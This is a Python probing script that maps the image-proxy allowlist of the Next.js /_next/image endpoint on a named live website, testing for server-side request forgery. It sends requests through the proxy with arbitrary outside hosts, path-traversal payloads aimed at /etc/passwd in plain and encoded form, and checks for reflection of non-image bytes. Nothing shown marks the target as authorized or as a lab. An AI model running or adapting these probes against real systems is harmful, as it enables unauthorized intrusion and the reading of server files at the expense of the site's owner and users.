#!/usr/bin/env python3
"""W19e: map the EXACT remotePatterns allowlist of /_next/image.

If only ctfassets is allowed -> no SSRF. If arbitrary hosts 200 -> SSRF is
open and the whole SSRF question reopens (and earlier 'blocked' conclusions
would be wrong).
"""
import re, time, urllib.request, urllib.error, urllib.parse

UA = "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/126.0 Safari/537.36"
BASE = "https://www.infinitycapital.bh"
REAL = "https://images.ctfassets.net/yts1dx0j7jj5/1GCT0vyjqmOwm2OL1YVpD1/2ab55f8b5189afa153eac5cb97f7f6d4/Ahmed_Taleb_updated-min.jpg"


def hit(urlparam, w="640", q="75", hdrs=None, path="/_next/image"):
    full = f"{BASE}{path}?url={urllib.parse.quote(urlparam, safe='')}&w={w}&q={q}"
    rq = urllib.request.Request(full, headers={"User-Agent": UA, "Accept": "image/*,*/*"})
    for k, v in (hdrs or {}).items():
        rq.add_header(k, v)
    try:
        with urllib.request.urlopen(rq, timeout=25) as r:
            b = r.read()
            return r.status, len(b), r.headers.get("content-type", ""), b[:16]
    except urllib.error.HTTPError as e:
        return e.code, len(e.read()), "", b""
    except Exception as e:
        return 0, 0, f"ERR:{e}", b""


print("=== host allowlist mapping (using REAL path on each host) ===")
hosts = [
    ("images.ctfassets.net", REAL),
    ("images.ctfassets.net", REAL.split("://")[1]),
    ("ctfassets.net", REAL.split("://")[1]),
    ("www.infinitycapital.bh", "/_next/image?url=" + REAL),
    ("www.infinitycapital.bh", "/"),
    ("infinitycapital.bh", "/"),
    ("example.com", "/nonexistent.jpg"),
    ("images.ctfassets.net", "/../../../../etc/passwd"),
    ("images.ctfassets.net", "/%2e%2e%2f%2e%2e%2fetc%2fpasswd"),
]
for h, p in hosts:
    u = p if p.startswith("http") else f"https://{h}{p}"
    st, ln, ct, head = hit(u)
    print(f"  {st} {ln:>6}B ct={ct:12s} {h:26s} {p[:40]}")
    time.sleep(1.5)

print("\n=== non-image content types on allowed host (info leak?) ===")
# ctfassets will 404 for these; check what the optimizer does with non-image bytes
st, ln, ct, head = hit("https://images.ctfassets.net/yts1dx0j7jj5/1GCT0vyjqmOwm2OL1YVpD1/2ab55f8b5189afa153eac5cb97f7f6d4/Ahmed_Taleb_updated-min.jpg", w="640", q="1")
print(f"  q=1: {st} {ln}B ct={ct}")

print("\n=== is there ANY content-length / arbitrary-byte reflect? ===")
# SSRF: can we make it fetch a URL that returns text, then reflect it? try ctfassets non-image
st, ln, ct, head = hit("https://images.ctfassets.net/yts1dx0j7jj5/nonexistent/x.txt")
print(f"  x.txt on allowed host: {st} {ln}B ct={ct} head={head[:30]!r}")
time.sleep(1.5)
st, ln, ct, head = hit("https://images.ctfassets.net/yts1dx0j7jj5/1GCT0vyjqmOwmOwm2OL1YVpD1/x.svg")
print(f"  x.svg on allowed host: {st} {ln}B ct={ct} head={head[:30]!r}")
